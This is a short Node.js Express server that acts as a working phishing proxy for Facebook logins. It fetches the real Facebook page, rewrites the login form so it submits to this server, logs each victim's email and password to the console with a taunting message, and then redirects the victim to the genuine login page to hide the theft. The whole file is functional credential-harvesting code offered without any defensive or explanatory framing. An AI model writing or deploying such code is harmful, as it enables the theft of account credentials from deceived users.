const express = require('express')
const path = require('path')
const PORT = process.env.PORT || 5000
const request = require('request');

express()
  .use(express.static(path.join(__dirname, 'public')))
  .use(express.json())
  .use(express.urlencoded({ extended: false }))
  .get('/', (req, res) => {
    request({
      url: 'https://facebook.com',
      headers: {
        'User-Agent': req.header('User-Agent'),
      }
    }, function (err, response, body) {
      res.send(body.replace('https://www.facebook.com/login/device-based/regular/login/', `${req.protocol}://${req.get('host')}/login/device-based/regular/login/`));
    });
  })
  .post('/login/device-based/regular/login/', (req, res) => {
    console.log("Someone who's clearly not aware of us tried to sign in!");
    console.log("Email: ", req.body.email);
    console.log("Password: ", req.body.pass);
    const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
    res.redirect(fullUrl.replace(`${req.protocol}://${req.get('host')}/login/device-based/regular/login/`, 'https://www.facebook.com/login/device-based/regular/login/'));
  })
  .listen(PORT, () => console.log(`Listening on ${ PORT }`))
